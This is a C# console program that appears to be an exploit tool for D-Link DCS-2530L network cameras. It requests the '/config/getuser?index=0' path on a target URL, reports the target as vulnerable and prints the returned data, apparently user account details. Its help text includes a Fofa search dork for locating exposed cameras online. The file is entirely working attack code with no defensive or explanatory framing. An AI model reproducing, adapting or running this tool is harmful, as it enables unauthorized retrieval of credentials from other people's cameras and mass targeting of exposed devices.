using System;
using System.Net;
using System.IO;
using System.Text;

namespace Dlink
{
    class Vuln_use
    {
        public void Help()
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("UseAge: DLink.exe https://192.168.1.2/");
            Console.WriteLine("Fofa dork: app=\"D_Link-DCS-2530L\"");
            Console.ForegroundColor = ConsoleColor.White;
        }
        public bool Vuln_Attack(string url)
        {
            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36";
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                var st_code = Convert.ToInt32(response.StatusCode);
                if (st_code == 200)
                {
                    Stream myResponseStream = response.GetResponseStream();
                    StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                    string retString = myStreamReader.ReadToEnd();
                    myStreamReader.Close();
                    myResponseStream.Close();

                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[+] Target is vuln!");
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine(retString);
                    Console.ForegroundColor = ConsoleColor.White;
                    return true;
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[-] Target is not vuln");
                    return false;
                }
            }
            catch
            {
                Console.WriteLine("Time out");
                return false;
            }
        }
    }
    class MainClass
    {
        public static void Main(string[] args)
        {
            Vuln_use vps = new Vuln_use();
            if(args.Length == 1)
            {
                string url = args[0];
                if(url.Substring(url.Length-1,1) == "/")
                {
                   string Vuln_url = url + "config/getuser?index=0";
                    vps.Vuln_Attack(Vuln_url);
                }
                else
                {
                   string Vuln_url = url + "/config/getuser?index=0";
                    vps.Vuln_Attack(Vuln_url);
                }
            }
            else
            {
                vps.Help();
            }
        }
    }
}
